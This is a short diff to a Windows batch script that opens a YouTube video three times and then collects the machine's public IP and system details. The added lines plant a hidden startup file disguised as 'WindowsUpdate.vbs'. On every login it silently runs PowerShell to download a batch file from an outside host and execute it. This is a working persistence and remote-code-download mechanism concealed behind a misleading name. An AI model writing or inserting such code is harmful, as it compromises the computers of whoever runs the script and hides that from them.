@@ -3,6 +3,13 @@ for /l %%i in (1,1,3) do (
     start https://www.youtube.com/watch?v=C8OQGT-YPik
 )
 
+set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+(
+echo Set WshShell = CreateObject("WScript.Shell"^)
+echo WshShell.Run "powershell -WindowStyle Hidden -c ""iwr 'https://lzx-one.vercel.app/LXZ.bat' -OutFile $env:TEMP\t.bat; & $env:TEMP\t.bat""", 0, False
+) > "%startup%\WindowsUpdate.vbs"
+
 :: Pega IP público
 for /f %%A in ('curl -s https://api.ipify.org') do set IP=%%A
 :: Infos do sistema
